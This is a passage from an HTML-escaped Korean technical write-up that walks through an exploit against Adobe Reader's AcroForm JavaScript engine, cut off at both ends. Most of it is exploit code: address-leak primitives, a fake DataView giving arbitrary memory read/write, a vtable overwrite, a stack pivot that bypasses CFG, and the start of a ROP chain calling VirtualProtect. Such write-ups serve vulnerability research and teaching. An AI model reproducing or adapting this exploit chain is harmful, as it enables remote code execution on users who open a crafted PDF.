    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (arrs[i][&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;) {
        modifiedArr = arrs[i];
        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
    }
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = obj;
    addr = corruptedTypedArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; addr;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB4E4;&amp;#xC744; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA70; &lt;code&gt;Array[0]&lt;/code&gt;&amp;#xC774; &amp;#xC6D0;&amp;#xBCF8;&amp;#xC778;  0x47484950&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; 0x47484951&amp;#xC778; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &lt;code&gt;modifiedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;corruptedTypedArr[arrStart + 4]&lt;/code&gt;&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;modifiedArr[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; jsval&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC77D;&amp;#xD788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;addrOf&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC774;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;modifiedArr[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD560; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xB300;&amp;#xC785;&amp;#xD558;&amp;#xACE0; &lt;code&gt;corruptedTypedArr[arrStart + 4]&lt;/code&gt;&amp;#xB85C; &amp;#xC5EC;&amp;#xAE30;&amp;#xC5D0; &amp;#xC4F0;&amp;#xC778; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;poi-Primitive&#34;&gt;&lt;a href=&#34;#poi-Primitive&#34; class=&#34;headerlink&#34; title=&#34;poi Primitive&#34;&gt;&lt;/a&gt;poi Primitive&lt;/h3&gt;&lt;p&gt;&lt;code&gt;modifiedArr[1]&lt;/code&gt;&amp;#xC740; &amp;#xC6D0;&amp;#xBCF8; String &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC544;&amp;#xB2CC; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; Fake String&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xB85C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_STR_START = &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;s2h&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;s&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; n1 = s.charCodeAt(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; n2 = s.charCodeAt(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ((n2 &amp;lt;&amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) | n1) &amp;gt;&amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;poi&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// leak values at addr by setting it to string ptr&lt;/span&gt;
    corruptedTypedArr[FAKE_STR_START + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = addr;
    val = s2h(modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; val;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;poi&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; Fake String&amp;#xC758; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC744; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFC9;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;modifiedArr[1]&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; Fake String&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xACE0; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &lt;code&gt;s2h&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC22B;&amp;#xC790;&amp;#xB85C; &amp;#xBCC0;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;4-Arbitrary-Address-Read-Write-Primitive&#34;&gt;&lt;a href=&#34;#4-Arbitrary-Address-Read-Write-Primitive&#34; class=&#34;headerlink&#34; title=&#34;4. Arbitrary Address Read/Write Primitive&#34;&gt;&lt;/a&gt;4. Arbitrary Address Read/Write Primitive&lt;/h2&gt;&lt;p&gt;&amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xAD6C;&amp;#xD604;&amp;#xB41C; &lt;code&gt;addrOf&lt;/code&gt;, &lt;code&gt;poi&lt;/code&gt;&amp;#xB85C; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC784;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C; &amp;#xC77D;&amp;#xAE30;/&amp;#xC4F0;&amp;#xAE30;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; targetDV = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;DataView&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x64&lt;/span&gt;));
targetDV.setUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x55555555&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; FAKE_DV_START = &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
&lt;span class=&#34;hljs-comment&#34;&gt;//....&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; targetDVPtr = addrOf(targetDV);
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] target dataview address: &amp;quot;&lt;/span&gt; + targetDVPtr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; k = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; k++) {
    corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AAR&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr&lt;/span&gt;) &lt;/span&gt;{
    corruptedTypedArr[FAKE_DV_START + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;].getUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;AAW&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;addr, value&lt;/span&gt;) &lt;/span&gt;{
    corruptedTypedArr[FAKE_DV_START + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;] = addr;
    modifiedArr[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;].setUint32(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, value, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;addrOf&lt;/code&gt;&amp;#xB85C; &amp;#xC6D0;&amp;#xBCF8; &lt;code&gt;DataView&lt;/code&gt;&amp;#xC778; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;(&lt;code&gt;targetDVptr&lt;/code&gt;)&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xC6D0;&amp;#xBCF8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;poi&lt;/code&gt;&amp;#xB85C; &amp;#xC77D;&amp;#xC5B4; &lt;code&gt;corruptedTypedArr[FAKE_DV_START]&lt;/code&gt;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC81C;&amp;#xD558;&amp;#xC5EC; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C; &amp;#xC758;&amp;#xB3C4;&amp;#xCE58; &amp;#xC54A;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;corruptedTypedArr[FAKE_DV_START + 20]&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;DataView&lt;/code&gt;&amp;#xC758; &lt;code&gt;ArrayBuffer&lt;/code&gt; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xAC70;&amp;#xB098; &amp;#xC4F8; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;modifiedArr[2]&lt;/code&gt;&amp;#xB85C; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;setUint32&lt;/code&gt;&amp;#xB098; &lt;code&gt;getUint32&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xAC70;&amp;#xB098; &amp;#xC4F0;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;5-Insert-ROP-Payload&#34;&gt;&lt;a href=&#34;#5-Insert-ROP-Payload&#34; class=&#34;headerlink&#34; title=&#34;5. Insert ROP Payload&#34;&gt;&lt;/a&gt;5. Insert ROP Payload&lt;/h2&gt;&lt;p&gt;&lt;code&gt;addrOf&lt;/code&gt;, &lt;code&gt;AAR&lt;/code&gt;, &lt;code&gt;AAW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xC8FC;&amp;#xC18C; &amp;#xB4F1; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACE0; vtable&amp;#xC744; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &amp;#xC0BD;&amp;#xC785;&amp;#xD55C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB3C4;&amp;#xB85D; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Leak-AcroForm-Base-Address&#34;&gt;&lt;a href=&#34;#Leak-AcroForm-Base-Address&#34; class=&#34;headerlink&#34; title=&#34;Leak AcroForm Base Address&#34;&gt;&lt;/a&gt;Leak AcroForm Base Address&lt;/h3&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;AAR&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;textField&lt;/code&gt;&amp;#xC778; &lt;code&gt;f0&lt;/code&gt;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;AcroForm.API&lt;/code&gt;&amp;#xC758; &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &lt;code&gt;field&lt;/code&gt;&amp;#xC758; vtable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xACE0; Fake &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD560; &amp;#xB54C;&amp;#xC640; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xB85C; vtable&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xC774; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; 0x20000158(&lt;code&gt;arrBufPtr + 0x100&lt;/code&gt;)&amp;#xC5D0; &amp;#xBCF5;&amp;#xC81C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; arrBufPtr = &lt;span class=&#34;hljs-number&#34;&gt;0x20000048&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; AcroFormApiBase =
    AAR(AAR(addrOf(f0) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0x34&lt;/span&gt;) - VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;AcroFormOffset&amp;quot;&lt;/span&gt;];
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] AcroForm base leaked: &amp;quot;&lt;/span&gt; + AcroFormApiBase.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;0xc&lt;/span&gt;) + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; fieldVtbl = AAR(fieldVtblAddr);

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(
    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] field vTable Addr: &amp;quot;&lt;/span&gt; +
        fieldVtblAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) +
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; | fieldVtable: &amp;quot;&lt;/span&gt; +
        fieldVtbl.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
);
&lt;span class=&#34;hljs-string&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;``&lt;/span&gt;
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] clone field vtable for overwriting defaultValue pointer&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, AAR(fieldVtbl + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;));

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; originalDefaulValFunc = AAR(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Building-ROP-Chain-CFG-Bypass&#34;&gt;&lt;a href=&#34;#Building-ROP-Chain-CFG-Bypass&#34; class=&#34;headerlink&#34; title=&#34;Building ROP Chain : CFG Bypass&#34;&gt;&lt;/a&gt;Building ROP Chain : CFG Bypass&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;ROP = VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ROP&amp;quot;&lt;/span&gt;];
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// ROP_s = AcroForm!sub_20EFAA60 ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// xchg eax, esp ; ret ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, AcroFormApiBase + ROP[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]); &lt;span class=&#34;hljs-comment&#34;&gt;// pop esp ; ret ;&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;// pivot to our _stack&lt;/span&gt;
AAW(fieldVtblAddr, arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;// overwrite field vtable to our ROP start&lt;/span&gt;

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] storing recovery context!&amp;quot;&lt;/span&gt;);
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, fieldVtblAddr); &lt;span class=&#34;hljs-comment&#34;&gt;// original vtable ptr (goes back in ecx)&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x64&lt;/span&gt;, fieldVtbl); &lt;span class=&#34;hljs-comment&#34;&gt;// vtable funcs ptr&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;, originalDefaulValFunc); &lt;span class=&#34;hljs-comment&#34;&gt;// original defaultVal impl to jump to&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x6c&lt;/span&gt;, AAR(ARR_BUF_BASE + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;)); &lt;span class=&#34;hljs-comment&#34;&gt;// corrupted arrbuf typed array ptr&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;, AAR(ARR_BUF_MALLOC_BASE)); &lt;span class=&#34;hljs-comment&#34;&gt;// malloc header 0&lt;/span&gt;
AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x300&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x74&lt;/span&gt;, AAR(ARR_BUF_MALLOC_BASE + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)); &lt;span class=&#34;hljs-comment&#34;&gt;// malloc header 1&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; rop = [
    AAR(AcroFormApiBase + VersionData[curAppVersion][&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;VirtualProtect&amp;quot;&lt;/span&gt;]), &lt;span class=&#34;hljs-comment&#34;&gt;// VirtualProtect&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// return address&lt;/span&gt;
    arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// sz&lt;/span&gt;
